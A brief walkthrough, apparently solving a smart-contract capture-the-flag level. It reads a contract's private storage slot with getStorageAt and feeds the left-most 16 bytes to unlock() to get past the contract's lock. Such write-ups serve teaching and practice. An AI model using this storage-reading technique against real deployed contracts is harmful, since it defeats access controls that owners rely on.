Get storage at the right position
```javascript
await web3.eth.getStorageAt(contract.address, 5)
```

use the left-most 16 bytes to call unlock()
```javacript
await contract.unlock("0x61cc9eb7d5bf353a40ae47061291ca0f")
```
